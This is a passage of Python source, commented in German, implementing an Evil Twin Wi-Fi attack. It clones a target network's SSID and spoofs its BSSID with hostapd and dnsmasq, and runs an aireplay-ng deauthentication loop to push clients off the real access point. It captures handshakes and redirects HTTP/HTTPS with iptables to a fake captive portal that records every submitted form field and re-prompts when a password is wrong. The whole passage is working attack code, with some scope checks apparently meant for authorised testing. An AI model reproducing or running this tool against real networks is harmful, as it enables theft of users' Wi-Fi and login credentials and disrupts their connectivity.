class CaptivePortalServer:
    """Eingebetteter HTTP-Server fuer das Captive Portal."""

    def __init__(
        self,
        port: int = 80,
        html_template: str = "",
        credential_cb=None,
        log_cb=None,
        verify_cb=None,
        template_name: str = "default",
    ):
        self.port = int(port)
        # v10.7d: Template aus Registry wenn html_template leer
        if html_template:
            self.html = html_template
        else:
            self.html = PortalTemplates.get(template_name)
        self.credential_cb = credential_cb
        self.log_cb = log_cb
        self.verify_cb = verify_cb
        self.template_name = template_name
        self._server = None
        self._thread = None
        self._stop_event = threading.Event()
        # Track: pro IP wie viele Fehlversuche
        self._attempts: dict = {}

    def _log(self, msg: str, level: str = "INFO") -> None:
        if self.log_cb is not None:
            try:
                self.log_cb(msg, level)
            except (RuntimeError, TypeError):
                pass

    def start(self) -> bool:
        try:
            from http.server import HTTPServer, BaseHTTPRequestHandler
        except ImportError:
            self._log("http.server fehlt", "ERR")
            return False

        html = self.html
        cred_cb = self.credential_cb
        log_cb = self._log
        verify_cb = self.verify_cb

        class _Handler(BaseHTTPRequestHandler):
            server_version = "EvilTwinPortal/1.0"

            def log_message(self, fmt, *args):
                # Default-stderr unterdruecken
                pass

            def _send_default(self):
                try:
                    self.send_response(200)
                    self.send_header(
                        "Content-Type",
                        "text/html; charset=utf-8",
                    )
                    self.send_header("Cache-Control", "no-store")
                    self.end_headers()
                    self.wfile.write(html.encode("utf-8"))
                except (OSError, ConnectionError):
                    pass

            def do_GET(self):
                ip = self.client_address[0] if self.client_address else "?"
                log_cb("HTTP GET " + str(self.path) + " from " + str(ip), "INFO")
                self._send_default()

            def do_POST(self):
                with DiagContext("portal.do_POST", None, reraise=False):
                    ip = self.client_address[0] if self.client_address else "?"
                    try:
                        length = int(self.headers.get("Content-Length", 0))
                        body = self.rfile.read(length).decode("utf-8", "replace")
                        log_cb("HTTP POST " + str(self.path) + " from " + str(ip), "INFO")
                        try:
                            from urllib.parse import parse_qs

                            params = parse_qs(body, keep_blank_values=True)
                        except ImportError:
                            params = {}

                        # Credential-Capture
                        if cred_cb is not None:
                            for key, values in params.items():
                                for val in values:
                                    try:
                                        cred_cb(ip, key, val)
                                    except (RuntimeError, TypeError):
                                        pass

                        # v10.7d: Passwort-Verifikation
                        password = ""
                        for key in ("password", "passwort", "pw", "pwd"):
                            vals = params.get(key, [])
                            if vals:
                                password = vals[0]
                                break

                        if verify_cb is not None and password:
                            try:
                                ok = verify_cb(ip, password)
                            except (RuntimeError, TypeError):
                                ok = None
                            if ok is True:
                                # Passwort korrekt → "Erfolg"-Seite
                                success_html = (
                                    "<!DOCTYPE html><html lang='de'><head>"
                                    "<meta charset='utf-8'><title>Erfolg</title>"
                                    "<style>body{font-family:Arial;background:#f0f4f9;"
                                    "display:flex;justify-content:center;align-items:center;"
                                    "min-height:100vh;margin:0;text-align:center}"
                                    ".box{background:#fff;padding:40px;border-radius:12px;"
                                    "box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:380px}"
                                    ".ok{font-size:64px;color:#27ae60;margin:0}"
                                    "h1{color:#27ae60;margin:12px 0}"
                                    "p{color:#666}</style></head><body>"
                                    "<div class='box'>"
                                    "<div class='ok'>✓</div>"
                                    "<h1>Anmeldung erfolgreich</h1>"
                                    "<p>Die Verbindung wird hergestellt.</p>"
                                    "<p style='font-size:11px;color:#999'>"
                                    "Test-Modus: Passwort bestaetigt</p>"
                                    "</div></body></html>"
                                )
                                self.send_response(200)
                                self.send_header("Content-Type", "text/html; charset=utf-8")
                                self.send_header("Cache-Control", "no-store")
                                self.end_headers()
                                self.wfile.write(success_html.encode("utf-8"))
                                log_cb("Passwort fuer " + str(ip) + " VERIFIZIERT", "OK")
                                return
                            elif ok is False:
                                # Falsch → 2. Chance
                                self.send_response(200)
                                self.send_header("Content-Type", "text/html; charset=utf-8")
                                self.send_header("Cache-Control", "no-store")
                                self.end_headers()
                                wrong_html = (
                                    "<!DOCTYPE html><html lang='de'><head>"
                                    "<meta charset='utf-8'><title>Fehler</title>"
                                    "<style>body{font-family:Arial;background:#f0f4f9;"
                                    "display:flex;justify-content:center;align-items:center;"
                                    "min-height:100vh;margin:0}"
                                    ".box{background:#fff;padding:32px;border-radius:12px;"
                                    "box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:400px;"
                                    "width:100%}"
                                    "h1{color:#c00;font-size:20px;margin:0 0 8px}"
                                    "p{color:#666;font-size:14px;margin:0 0 20px}"
                                    "input{width:100%;padding:12px;font-size:15px;"
                                    "box-sizing:border-box;border:2px solid #e0e0e0;"
                                    "border-radius:8px;margin-bottom:12px}"
                                    "input:focus{outline:none;border-color:#007aff}"
                                    "button{width:100%;padding:14px;font-size:15px;"
                                    "font-weight:600;background:#007aff;color:#fff;"
                                    "border:none;border-radius:8px;cursor:pointer}"
                                    "</style></head><body>"
                                    "<form class='box' method='post' action='/login'>"
                                    "<h1>Anmeldung fehlgeschlagen</h1>"
                                    "<p>Das eingegebene Passwort ist falsch. "
                                    "Bitte versuchen Sie es erneut.</p>"
                                    "<input type='text' name='username' "
                                    "placeholder='Benutzername' autocomplete='off'>"
                                    "<input type='password' name='password' "
                                    "placeholder='Passwort' autocomplete='off' autofocus>"
                                    "<button type='submit'>Erneut versuchen</button>"
                                    "</form></body></html>"
                                )
                                self.wfile.write(wrong_html.encode("utf-8"))
                                log_cb(
                                    "Passwort fuer " + str(ip) + " FALSCH — 2. Chance",
                                    "WARN",
                                )
                                return

                        # Kein Verifier / kein Passwort → redirect
                        self.send_response(302)
                        self.send_header(
                            "Location",
                            "http://connectivitycheck.gstatic.com/generate_204",
                        )
                        self.send_header("Cache-Control", "no-store")
                        self.end_headers()
                    except (OSError, ConnectionError, ValueError):
                        pass

            def do_HEAD(self):
                try:
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.end_headers()
                except (OSError, ConnectionError):
                    pass

        try:
            self._server = HTTPServer(("0.0.0.0", self.port), _Handler)  # noqa: S104
        except OSError as exc:
            self._log(
                "Portal-Bind auf Port "
                + str(self.port)
                + " fehlgeschlagen: "
                + str(exc),
                "ERR",
            )
            self._server = None
            return False

        self._thread = threading.Thread(
            target=_thread_wrap(self._server.serve_forever, "EvilTwinPortal"),
            daemon=True,
            name="EvilTwinPortal",
        )
        self._thread.start()
        self._log("Portal-Server laeuft auf 0.0.0.0:" + str(self.port), "OK")
        return True

    def stop(self) -> None:
        self._stop_event.set()
        try:
            if self._server is not None:
                self._server.shutdown()
                self._server.server_close()
        except (OSError, RuntimeError, AttributeError):
            pass
        self._server = None
        self._thread = None


class EvilTwinController(QObject):
    """Orchestriert hostapd + dnsmasq + Captive Portal."""

    log_signal = pyqtSignal(str, str)
    started_signal = pyqtSignal()
    stopped_signal = pyqtSignal(str)
    client_signal = pyqtSignal(str, str)
    credential_signal = pyqtSignal(str, str, str)
    error_signal = pyqtSignal(str)

    def __init__(self, config: EvilTwinConfig, parent=None):
        super().__init__(parent)
        self.config = config
        self.logger = logging.getLogger("wlan_ultimate.EvilTwinController")
        self.store = CredentialStore()
        self.portal = CaptivePortalServer(
            port=config.portal_port,
            html_template=config.portal_html,
            credential_cb=self._on_credential,
            log_cb=self._on_log,
            verify_cb=self._verify_portal_password,
            template_name=getattr(config, "portal_template", "default"),
        )
        self._hostapd_proc = None
        self._dnsmasq_proc = None
        self._deauth_thread = None
        self._deauth_stop = threading.Event()
        self._duration_timer = None
        self._running = False
        self._temp_dir = None
        self._t0 = 0.0

    # ── Callbacks (aus Worker-Threads) ───────────────────────────
    def _on_log(self, msg: str, level: str = "INFO") -> None:
        try:
            self.log_signal.emit(str(msg)[:300], str(level))
        except (RuntimeError, AttributeError):
            pass

    def _on_credential(self, ip: str, field: str, value: str) -> None:
        self.store.add_client(ip)
        self.store.add_credential(ip, field, value)
        try:
            self.credential_signal.emit(str(ip), str(field), str(value))
        except (RuntimeError, AttributeError):
            pass

    # ── Preflight ────────────────────────────────────────────────
    def preflight(self) -> tuple:
        with DiagContext("evil.preflight", getattr(self, "logger", None), reraise=False):
            # P6.2: Fingerprints -> iface-Namen (vor validate)
            ok, err = self.config.resolve_ifaces()
            if not ok:
                return False, err

            ok, err = self.config.validate()
            if not ok:
                return False, err

            # P6.4b: Reg-Domain-Warnung (nicht blockierend)
            tx_ok, tx_msg = self.config.check_txpower_compliance()
            if not tx_ok:
                try:
                    self._on_log("Reg-Domain-Warnung: " + tx_msg, "WARN")
                except (RuntimeError, AttributeError):
                    pass

            if not hasattr(os, "geteuid") or os.geteuid() != 0:
                return False, "Root-Rechte erforderlich (sudo)"

            # ── Tools ──────────────────────────────────────────────
            required_tools = ["hostapd", "dnsmasq", "iw", "ip"]
            if self.config.enable_nat:
                required_tools.append("iptables")
            if self.config.deauth_clients:
                required_tools.append("aireplay-ng")
            if self.config.handshake_capture:
                required_tools.extend(["hcxdumptool", "hcxpcapngtool"])
            if self.config.verify_password:
                required_tools.append("hashcat")

            missing = [t for t in required_tools if shutil.which(t) is None]
            if missing:
                return False, (
                    "Fehlende Tools: "
                    + ", ".join(missing)
                    + " — apt install "
                    + " ".join(missing)
                )

            # ── Interface-Existenz ─────────────────────────────────
            if not Path("/sys/class/net/" + self.config.iface_ap).exists():
                return False, ("iface_ap '" + self.config.iface_ap + "' existiert nicht")

            if (
                self.config.deauth_clients
                and self.config.iface_deauth
                and not Path("/sys/class/net/" + self.config.iface_deauth).exists()
            ):
                return False, (
                    "iface_deauth '" + self.config.iface_deauth + "' existiert nicht"
                )

            # ── 2-Adapter-Pflicht bei Deauth ───────────────────────
            if self.config.deauth_clients:
                if not self.config.iface_deauth:
                    return False, (
                        "Deauth benoetigt zweites Interface — " "iface_deauth leer"
                    )
                if self.config.iface_ap == self.config.iface_deauth:
                    return False, (
                        "iface_ap und iface_deauth sind identisch ("
                        + self.config.iface_ap
                        + ") — zwei verschiedene Adapter noetig"
                    )
                # v10.8: Deauth-IF muss im Monitor-Mode sein
                try:
                    _rc, _out, _ = CommandRunner.run(
                        ["iw", "dev", self.config.iface_deauth, "info"],
                        subsystem="driver",
                        tag="evil-preflight-mon",
                        soft_fail=True,
                        timeout=3,
                    )
                    if "type monitor" not in (_out or ""):
                        return False, (
                            "iface_deauth '"
                            + self.config.iface_deauth
                            + "' ist nicht im Monitor-Mode. "
                            + "Vorher: airmon-ng start "
                            + self.config.iface_deauth
                        )
                except (OSError, subprocess.SubprocessError):
                    pass

            # ── AP-Fähigkeit prüfen ────────────────────────────────
            try:
                phy = self._iface_phy(self.config.iface_ap)
                if phy:
                    rc, out, _ = CommandRunner.run(
                        ["iw", "phy", phy, "info"],
                        subsystem="driver",
                        tag="evil-preflight",
                        soft_fail=True,
                        timeout=5,
                    )
                    in_modes = False
                    ap_ok = False
                    for line in (out or "").splitlines():
                        ls = line.strip()
                        if ls.startswith("Supported interface modes:"):
                            in_modes = True
                            continue
                        if in_modes:
                            if ls.startswith("*"):
                                if "AP" in ls:
                                    ap_ok = True
                            elif ls and not ls.startswith("*"):
                                break
                    if not ap_ok:
                        return False, (
                            "iface_ap '"
                            + self.config.iface_ap
                            + "' unterstuetzt keinen AP-Modus"
                        )
            except (OSError, subprocess.SubprocessError, RuntimeError):
                pass

            # ── PMF-Hardblock ──────────────────────────────────────
            if getattr(self, "_target_pmf_required", False):
                if self.config.deauth_clients:
                    return False, (
                        "Ziel-AP hat PMF (802.11w) REQUIRED — "
                        "Deauth wird ignoriert. Bitte Deauth deaktivieren "
                        "oder Ziel ohne PMF waehlen."
                    )
            return True, ""

        return False, "preflight: unerwartete Exception (siehe Log)"

    def _iface_phy(self, iface: str) -> str:
        """Liefert phyN zu einem Interface-Namen."""
        try:
            rc, out, _ = CommandRunner.run(
                ["iw", "dev", iface, "info"],
                subsystem="driver",
                tag="phy-lookup",
                soft_fail=True,
                timeout=3,
            )
            for line in (out or "").splitlines():
                m = re.search(r"wiphy\s+(\d+)", line)
                if m:
                    return "phy" + m.group(1)
        except (OSError, subprocess.SubprocessError, re.error):
            pass
        return ""

    # ── Start / Stop ─────────────────────────────────────────────
    def start(self) -> bool:
        if self._running:
            self._on_log("Controller laeuft bereits", "WARN")
            return True

        ok, err = self.preflight()
        if not ok:
            self._on_log("Preflight fehlgeschlagen: " + str(err), "ERR")
            try:
                self.error_signal.emit(str(err))
            except (RuntimeError, AttributeError):
                pass
            return False

        # v10.8: Scope-Hinweis im Log (strict hat schon geblockt)
        if self.config.scope_path or self.config.scope_mode != "off":
            _sok, _smsg = self.config.check_scope()
            if _smsg:
                self._on_log(
                    "Scope: " + _smsg,
                    "INFO" if _sok else "WARN",
                )

        # v10.8.2: verwaiste Prozesse + Temp-Dirs killen
        try:
            subprocess.run(
                ["pkill", "-f", "hostapd /tmp/evil_twin_"],
                capture_output=True, timeout=3, check=False,
            )
            subprocess.run(
                ["pkill", "-f", "dnsmasq -C /tmp/evil_twin_"],
                capture_output=True, timeout=3, check=False,
            )
            import glob as _glob
            for _d in _glob.glob("/tmp/evil_twin_*"):
                try:
                    shutil.rmtree(_d, ignore_errors=True)
                except (OSError, PermissionError):
                    pass
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            pass

        self._t0 = time.time()
        try:
            self._temp_dir = Path(tempfile.mkdtemp(prefix="evil_twin_"))
        except OSError as exc:
            self._on_log("tempfile: " + str(exc), "ERR")
            return False

        if not self._write_hostapd_conf():
            return False
        if not self._write_dnsmasq_conf():
            return False

        if self.config.spoof_mac:
            self._spoof_mac()

        self._iface_up(self.config.iface_ap)

        if not self._start_hostapd():
            return False
        time.sleep(1.0)
        if not self._start_dnsmasq():
            self.stop("dnsmasq fehlgeschlagen")
            return False

        if self.config.capture_credentials:
            if not self.portal.start():
                self._on_log("Portal-Start fehlgeschlagen", "WARN")

        # v10.7b: iptables VOR Portal-Nutzung aktivieren
        if self.config.enable_nat:
            if not self._setup_iptables():
                self._on_log(
                    "iptables-Setup fehlgeschlagen — Angriff "
                    "laeuft ohne Redirect weiter",
                    "WARN",
                )

        if self.config.deauth_clients and self.config.iface_deauth:
            self._start_deauth_loop()

        # v10.7b: Paralleler Handshake-Capture
        if self.config.handshake_capture and self.config.iface_deauth:
            self._start_handshake_capture()

        self._running = True
        self._on_log("Evil Twin gestartet auf " + self.config.iface_ap, "OK")
        try:
            self.started_signal.emit()
        except (RuntimeError, AttributeError):
            pass

        if self.config.duration_sec > 0:
            self._start_duration_timer()
        return True

    def stop(self, reason: str = "Benutzer") -> None:
        self._running = False
        self._deauth_stop.set()

        try:
            self.portal.stop()
        except (OSError, RuntimeError, AttributeError):
            pass

        # v10.7b: iptables aufraeumen
        try:
            self._teardown_iptables()
        except (AttributeError, RuntimeError, OSError):
            pass

        # v10.7b: Handshake-Capture stoppen
        try:
            proc = getattr(self, "_handshake_proc", None)
            if proc is not None and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
        except (AttributeError, OSError, subprocess.SubprocessError):
            pass

        for attr, label in (("_dnsmasq_proc", "dnsmasq"), ("_hostapd_proc", "hostapd")):
            proc = getattr(self, attr, None)
            if proc is None:
                continue
            try:
                if proc.poll() is None:
                    proc.terminate()
                    try:
                        proc.wait(timeout=3)
                    except subprocess.TimeoutExpired:
                        proc.kill()
            except (OSError, RuntimeError, subprocess.SubprocessError):
                pass
            setattr(self, attr, None)
            self._on_log(label + " gestoppt", "INFO")

        if self._temp_dir is not None:
            try:
                shutil.rmtree(str(self._temp_dir), ignore_errors=True)
            except (OSError, PermissionError):
                pass
            self._temp_dir = None

        try:
            dur = int(time.time() - self._t0) if self._t0 else 0
            self._on_log(
                "Evil Twin gestoppt (Grund: "
                + str(reason)
                + ", Dauer: "
                + str(dur)
                + "s, Credentials: "
                + str(self.store.count())
                + ")",
                "OK",
            )
            self.stopped_signal.emit(str(reason))
        except (RuntimeError, AttributeError):
            pass

    def is_running(self) -> bool:
        return self._running

    # ── Interne Helfer ───────────────────────────────────────────
    def _iface_up(self, iface: str) -> bool:
        # v10.8: Regulatory-Domain optional setzen
        if self.config.reg_domain:
            try:
                subprocess.run(
                    ["iw", "reg", "set", self.config.reg_domain],
                    capture_output=True,
                    timeout=5,
                    check=False,
                )
                self._on_log(
                    "Regulatory-Domain: " + self.config.reg_domain, "INFO"
                )
            except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
                pass
        cmds = [
            ["ip", "link", "set", iface, "down"],
            ["iw", "dev", iface, "set", "type", "__ap"],
            ["ip", "link", "set", iface, "up"],
            ["ip", "addr", "flush", "dev", iface],
            ["ip", "addr", "add", self.config.gateway_ip + "/24", "dev", iface],
        ]
        for cmd in cmds:
            try:
                subprocess.run(cmd, capture_output=True, timeout=5, check=False)
            except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
                pass
        # v10.8: TX-Power fest setzen (mBm = dBm * 100)
        if self.config.txpower_dbm > 0:
            try:
                mb = int(self.config.txpower_dbm) * 100
                subprocess.run(
                    ["iw", "dev", iface, "set", "txpower", "fixed", str(mb)],
                    capture_output=True,
                    timeout=5,
                    check=False,
                )
                r = subprocess.run(
                    ["iw", "dev", iface, "info"],
                    capture_output=True,
                    text=True,
                    timeout=3,
                    check=False,
                )
                m = re.search(
                    r"txpower\s+([\d.]+)\s+dBm", r.stdout or ""
                )
                if m:
                    self._on_log(
                        "TX-Power: "
                        + m.group(1)
                        + " dBm (angefordert "
                        + str(self.config.txpower_dbm)
                        + " dBm)",
                        "OK",
                    )
                else:
                    self._on_log(
                        "TX-Power gesetzt: "
                        + str(self.config.txpower_dbm)
                        + " dBm",
                        "INFO",
                    )
            except (
                FileNotFoundError,
                subprocess.TimeoutExpired,
                OSError,
                re.error,
            ) as exc:
                self._on_log("TX-Power: " + str(exc), "WARN")
        return True

    def _spoof_mac(self) -> None:
        iface = self.config.iface_ap
        try:
            subprocess.run(
                ["ip", "link", "set", iface, "down"],
                capture_output=True,
                timeout=5,
                check=False,
            )
            if shutil.which("macchanger"):
                subprocess.run(
                    ["macchanger", "-m", self.config.target_bssid, iface],
                    capture_output=True,
                    timeout=10,
                    check=False,
                )
            else:
                subprocess.run(
                    ["ip", "link", "set", iface, "address", self.config.target_bssid],
                    capture_output=True,
                    timeout=10,
                    check=False,
                )
            subprocess.run(
                ["ip", "link", "set", iface, "up"],
                capture_output=True,
                timeout=5,
                check=False,
            )
            self._on_log("MAC gespooft: " + self.config.target_bssid, "OK")
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError) as exc:
            self._on_log("MAC-Spoof: " + str(exc), "WARN")

    def _write_hostapd_conf(self) -> bool:
        try:
            hw_mode = self.config.hw_mode_override or (
                "g" if self.config.target_channel <= 14 else "a"
            )
            conf = (
                "interface="
                + self.config.iface_ap
                + "\n"
                + "driver=nl80211\n"
                + "ssid="
                + self.config.target_ssid
                + "\n"
                + "hw_mode="
                + hw_mode
                + "\n"
                + "channel="
                + str(self.config.target_channel)
                + "\n"
                + "beacon_int="
                + str(self.config.beacon_rate)
                + "\n"
                + "auth_algs=1\n"
                + "ignore_broadcast_ssid=0\n"
                + "macaddr_acl=0\n"
                + "logger_syslog=-1\n"
                + "logger_syslog_level=2\n"
            )
            # v10.7b: Offenes Netz ist Default
            if self.config.open_network:
                conf += "wpa=0\n"
                self._on_log("hostapd: OFFENES Netz (empfohlen fuer Evil Twin)", "OK")
            else:
                passphrase = self.config.open_wpa_passphrase or "EvilTwinTest2026"
                conf += (
                    "wpa=2\n"
                    + "wpa_key_mgmt=WPA-PSK\n"
                    + "wpa_pairwise=CCMP\n"
                    + "wpa_passphrase="
                    + passphrase
                    + "\n"
                )
                self._on_log("hostapd: WPA2-Netz (Passphrase gesetzt)", "INFO")
            for k, v in self.config.hostapd_extra.items():
                conf += str(k) + "=" + str(v) + "\n"
            path = self._temp_dir / "hostapd.conf"
            path.write_text(conf, encoding="utf-8")
            return True
        except (OSError, AttributeError) as exc:
            self._on_log("hostapd.conf: " + str(exc), "ERR")
            return False

    def _write_dnsmasq_conf(self) -> bool:
        try:
            # v10.7c: DNS deaktiviert (port=0) um Konflikt mit
            # System-dnsmasq / NetworkManager zu vermeiden.
            # HTTP(S)-Redirect macht iptables — kein DNS nötig.
            conf = (
                "interface="
                + self.config.iface_ap
                + "\n"
                + "bind-dynamic\n"
                + "port=0\n"
                + "dhcp-range="
                + self.config.dhcp_range_start
                + ","
                + self.config.dhcp_range_end
                + ","
                + self.config.netmask
                + ","
                + self.config.dhcp_lease_time
                + "\n"
                + "dhcp-option=3,"
                + self.config.gateway_ip
                + "\n"
                + "dhcp-option=6,"
                + self.config.gateway_ip
                + "\n"
                + "log-dhcp\n"
                + "no-resolv\n"
                + "no-hosts\n"
                + "domain-needed\n"
            )
            for k, v in self.config.dnsmasq_extra.items():
                conf += str(k) + "=" + str(v) + "\n"
            path = self._temp_dir / "dnsmasq.conf"
            path.write_text(conf, encoding="utf-8")
            return True
        except (OSError, AttributeError) as exc:
            self._on_log("dnsmasq.conf: " + str(exc), "ERR")
            return False

    def _start_hostapd(self) -> bool:
        try:
            # v10.7c: OHNE -B — hostapd läuft im Vordergrund,
            # Popen kontrolliert den Prozess direkt.
            self._hostapd_proc = subprocess.Popen(
                ["hostapd", str(self._temp_dir / "hostapd.conf")],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            self._on_log(
                "hostapd gestartet (PID " + str(self._hostapd_proc.pid) + ")", "OK"
            )

            # Reader-Thread
            output_buf: list = []
            ap_enabled = {"ok": False}

            def _reader():
                try:
                    if self._hostapd_proc is None:
                        return
                    for line in self._hostapd_proc.stdout or []:
                        s = line.strip()
                        if not s:
                            continue
                        output_buf.append(s)
                        if len(output_buf) > 50:
                            output_buf.pop(0)
                        self._on_log("hostapd: " + s[:200], "INFO")
                        if "AP-ENABLED" in s:
                            ap_enabled["ok"] = True
                except (OSError, ValueError, RuntimeError):
                    pass

            threading.Thread(
                target=_thread_wrap(_reader, "evil-hostapd-reader"),
                daemon=True,
                name="HostapdReader",
            ).start()

            # Warte auf AP-ENABLED oder Timeout
            for _ in range(20):
                time.sleep(0.2)
                if self._hostapd_proc.poll() is not None:
                    break
                if ap_enabled["ok"]:
                    self._on_log("hostapd: AP aktiv", "OK")
                    return True

            if self._hostapd_proc.poll() is not None:
                rc = self._hostapd_proc.returncode
                tail = "\n".join(output_buf[-5:])
                self._on_log(
                    "hostapd beendet (rc=" + str(rc) + ") — letzte Zeilen:\n" + tail,
                    "ERR",
                )
                return False

            # Läuft noch, aber kein AP-ENABLED gesehen
            # Prüfe per iw ob Interface im AP-Mode
            try:
                rc, out, _ = CommandRunner.run(
                    ["iw", "dev", self.config.iface_ap, "info"],
                    subsystem="driver",
                    tag="hostapd-check",
                    soft_fail=True,
                    timeout=3,
                )
                if "type AP" in out:
                    self._on_log("hostapd läuft (AP-Mode verifiziert)", "OK")
                    return True
            except (OSError, subprocess.SubprocessError):
                pass

            self._on_log(
                "hostapd läuft, aber AP-Mode nicht bestätigt — " "fahre fort", "WARN"
            )
            return True

        except (FileNotFoundError, OSError, subprocess.SubprocessError) as exc:
            self._on_log("hostapd: " + str(exc), "ERR")
            return False

    def _start_dnsmasq(self) -> bool:
        try:
            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", str(self._temp_dir / "dnsmasq.conf"), "-d"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            self._on_log(
                "dnsmasq gestartet (PID " + str(self._dnsmasq_proc.pid) + ")", "OK"
            )

            def _reader():
                try:
                    if self._dnsmasq_proc is None:
                        return
                    for line in self._dnsmasq_proc.stdout or []:
                        s = line.strip()
                        if s:
                            self._on_log("dnsmasq: " + s[:200], "INFO")
                            if "DHCPACK" in s:
                                try:
                                    # DHCPACK(eth0) 192.168.66.5 aa:bb:...
                                    m = re.search(
                                        r"DHCPACK[^)]*\)\s+(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})",
                                        s,
                                        re.IGNORECASE,
                                    )
                                    if m:
                                        ip = m.group(1)
                                        mac = m.group(2).lower()
                                        self.store.add_client(ip, mac)
                                        try:
                                            self.client_signal.emit(mac, ip)
                                        except (RuntimeError, AttributeError):
                                            pass
                                except (AttributeError, re.error):
                                    pass
                except (OSError, ValueError, RuntimeError):
                    pass

            threading.Thread(
                target=_thread_wrap(_reader, "evil-dnsmasq-reader"),
                daemon=True,
                name="DnsmasqReader",
            ).start()
            time.sleep(1.0)
            if self._dnsmasq_proc.poll() is not None:
                self._on_log("dnsmasq ist sofort beendet", "ERR")
                return False
            return True
        except (FileNotFoundError, OSError, subprocess.SubprocessError) as exc:
            self._on_log("dnsmasq: " + str(exc), "ERR")
            return False

    def _start_deauth_loop(self) -> None:
        iface = self.config.iface_deauth
        bssid = self.config.target_bssid
        count = int(self.config.deauth_count)
        stop = self._deauth_stop

        def _loop():
            try:
                while not stop.is_set():
                    try:
                        cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, iface]
                        subprocess.run(
                            cmd, capture_output=True, timeout=30, check=False
                        )
                    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
                        pass
                    if stop.wait(15.0):
                        break
            except (RuntimeError, OSError):
                pass

        self._deauth_thread = threading.Thread(
            target=_thread_wrap(_loop, "evil-deauth-loop"),
            daemon=True,
            name="EvilTwinDeauth",
        )
        self._deauth_thread.start()
        self._on_log(
            "Deauth-Loop gestartet (alle 15s, " + str(count) + " Frames)", "OK"
        )

    def _start_duration_timer(self) -> None:
        def _timer():
            t = time.time() + max(1, int(self.config.duration_sec))
            while not self._deauth_stop.wait(1.0):
                if time.time() >= t:
                    self._on_log("Automatischer Stop (Dauer erreicht)", "WARN")
                    self.stop("Dauer")
                    return

        threading.Thread(
            target=_thread_wrap(_timer, "evil-timer"),
            daemon=True,
            name="EvilTwinTimer",
        ).start()

    # ── v10.7b: iptables ─────────────────────────────────────────
    def _iptables_cleanup_chain(self, chain: str) -> int:
        """v10.8.1: Entfernt -j chain-Referenzen zuverlaessig.

        Loescht per Regel-Nummer, weil -D nur matcht, wenn die
        komplette Rulespec (inkl. -i iface) uebereinstimmt.
        """
        iface = self.config.iface_ap
        removed = 0

        # Schritt 1: Alle -j chain-Referenzen in PREROUTING, OUTPUT,
        # POSTROUTING per Nummer finden und rueckwaerts loeschen.
        for table_chain in ("PREROUTING", "OUTPUT", "POSTROUTING"):
            try:
                r = subprocess.run(
                    [
                        "iptables", "-t", "nat",
                        "-L", table_chain, "--line-numbers", "-n",
                    ],
                    capture_output=True, text=True, timeout=5, check=False,
                )
            except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
                continue
            nums = []
            for line in (r.stdout or "").splitlines():
                parts = line.split()
                if len(parts) >= 2 and parts[1] == chain:
                    try:
                        nums.append(int(parts[0]))
                    except ValueError:
                        pass
            for num in sorted(nums, reverse=True):
                r2 = subprocess.run(
                    ["iptables", "-t", "nat", "-D", table_chain, str(num)],
                    capture_output=True, text=True, timeout=5, check=False,
                )
                if r2.returncode == 0:
                    removed += 1

        # Schritt 2: FORWARD-Accept-Reste (Bug v10.7b)
        for _ in range(20):
            r = subprocess.run(
                [
                    "iptables", "-D", "FORWARD",
                    "-i", iface, "-o", iface, "-j", "ACCEPT",
                ],
                capture_output=True, text=True, timeout=5, check=False,
            )
            if r.returncode != 0:
                break
            removed += 1

        # Schritt 3: Chain flushen + loeschen
        for cmd in (
            ["iptables", "-t", "nat", "-F", chain],
            ["iptables", "-t", "nat", "-X", chain],
        ):
            try:
                subprocess.run(
                    cmd, capture_output=True, text=True, timeout=5, check=False,
                )
            except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
                pass
        return removed

    def _setup_iptables(self) -> bool:
        """v10.8: Chain-basiertes NAT + HTTP(S)-Redirect (idempotent)."""
        with DiagContext("evil.iptables.setup", getattr(self, "logger", None), reraise=False):
            if not self.config.enable_nat:
                self._on_log("iptables/NAT deaktiviert", "INFO")
                return True

            chain = self.config.iptables_chain
            iface = self.config.iface_ap
            portal_port = int(self.config.portal_port)

            # v10.8: Erst eigene Reste entfernen (verhindert Doppelregeln)
            stale = self._iptables_cleanup_chain(chain)
            if stale:
                self._on_log(
                    "iptables: " + str(stale) + " alte Regel(n) entfernt", "INFO"
                )

            cmds = [["iptables", "-t", "nat", "-N", chain]]
            cmds.append([
                "iptables", "-t", "nat", "-A", chain,
                "-i", iface, "-p", "tcp", "--dport", "80",
                "-j", "REDIRECT", "--to-ports", str(portal_port),
            ])
            if self.config.redirect_https:
                cmds.append([
                    "iptables", "-t", "nat", "-A", chain,
                    "-i", iface, "-p", "tcp", "--dport", "443",
                    "-j", "REDIRECT", "--to-ports", str(portal_port),
                ])
            cmds.append([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-i", iface, "-j", chain,
            ])
            # Kein FORWARD-ACCEPT: Client landet im Portal, nicht im Internet.

            for cmd in cmds:
                try:
                    r = subprocess.run(
                        cmd, capture_output=True, text=True, timeout=5, check=False
                    )
                    if r.returncode != 0:
                        if "-N" in cmd and "already exists" in (r.stderr or ""):
                            continue
                        self._on_log(
                            "iptables: " + " ".join(cmd[2:]) + " -> "
                            + (r.stderr or "").strip()[:80],
                            "WARN",
                        )
                except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
                    self._on_log("iptables nicht verfuegbar", "ERR")
                    return False
            self._on_log("iptables-Chain '" + chain + "' aktiv", "OK")
            return True

        return False

    def _teardown_iptables(self) -> None:
        """v10.8: Sauberer iptables-Cleanup (idempotent)."""
        if not self.config.enable_nat:
            return
        chain = self.config.iptables_chain
        n = self._iptables_cleanup_chain(chain)
        self._on_log(
            "iptables aufgeraeumt (" + str(n) + " Referenzen)", "INFO"
        )

